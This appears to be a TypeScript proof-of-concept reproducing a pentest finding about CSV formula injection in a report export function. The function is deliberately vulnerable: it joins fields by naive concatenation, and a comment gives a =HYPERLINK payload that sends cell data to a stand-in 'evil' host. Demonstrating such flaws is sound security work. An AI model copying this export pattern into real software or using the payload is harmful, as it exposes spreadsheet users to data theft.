// Reproduces full PoC of PENTEST_REPORT 2026-05-18 F-01 with =HYPERLINK payload.
// NO real broadcasting code per ADR-004.
//
// Attack scenario:
//   1. Attacker uploads palinsesto XLSX where nomeReport = '=HYPERLINK(...)'
//   2. SIAE Operator runs POST /report/export
//   3. This function builds CSV by naive concat → payload preserved
//   4. Operator opens .csv in Excel → =HYPERLINK clicks fire HTTP exfiltration

interface Report {
  nomeFile: string;
  nomeReport: string;  // can contain =HYPERLINK("evil/?d="&A1, "x") from attacker
  emittente: string;
}

declare const db: { query(sql: string): Promise<Report[]> };
declare function uploadStringToS3(bucket: string, key: string, body: string): Promise<void>;

// VULNERABLE: payload =HYPERLINK / =WEBSERVICE survives the CSV pipeline.
export async function exportReportConsolidato(): Promise<void> {
  const reports: Report[] = await db.query("SELECT * FROM report");  // cross-tenant if F-02 active
  const headers = ["File", "Nome Report", "Emittente"];
  const rows = reports.map((r) => [r.nomeFile, r.nomeReport, r.emittente].join(","));
  const csv = [headers.join(","), ...rows].join("\n");
  await uploadStringToS3("export-bucket", "consolidato.csv", csv);
  // → Operator downloads → Excel evaluates =HYPERLINK/=WEBSERVICE → leak
}
